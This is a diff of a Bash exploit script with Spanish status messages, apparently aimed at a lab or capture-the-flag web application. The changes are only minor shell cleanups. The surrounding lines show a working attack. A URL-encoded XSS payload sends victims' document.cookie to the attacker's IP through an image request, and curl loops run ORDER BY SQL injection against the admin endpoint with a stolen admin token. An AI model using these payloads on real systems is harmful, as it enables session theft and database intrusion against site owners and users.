@@ -35,7 +35,7 @@ while [ "$item" == "" ]; do
     echo -e "   [*] Creando item XSRF malicioso..."
     xsrf_payload="title=XSRF&description=%3Cscript%3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F$ip_local%2Fimage.jpg%3F%27+%2B+document.cookie+%2B+%27%22%3E%3C%2Fimg%3E%27%29%3C%2Fscript%3E"
     item=$(curl -s -d $xsrf_payload -b $cookie http://$ip/new -L -i | html2text | grep item | tr ' ' '\n' | grep item | awk 'NF{print $NF}' FS='/')
-    try=$(( $try + 1 ))
+    try=$(( try + 1 ))
 done
 
 echo "      [+] Item malicioso creado: $item"
@@ -66,7 +66,7 @@ sleep 2
 
 echo -e "\n[*] Obteniendo tamano de tabla en http://$ip/admin?user=1..."
 for i in $(seq 1 100); do
-    curl -s -b $adm_token "http://$ip/admin?user=1%20ORDER%20BY%20$i;--%20-" | html2text | grep Error &>/dev/null && count=$(($i - 1)) && break
+    curl -s -b $adm_token "http://$ip/admin?user=1%20ORDER%20BY%20$i;--%20-" | html2text | grep -q Error && count=$((i - 1)) && break
 done
 sec=$(seq 1 $count | tr '\n' ',')
 sec=${sec::-1}
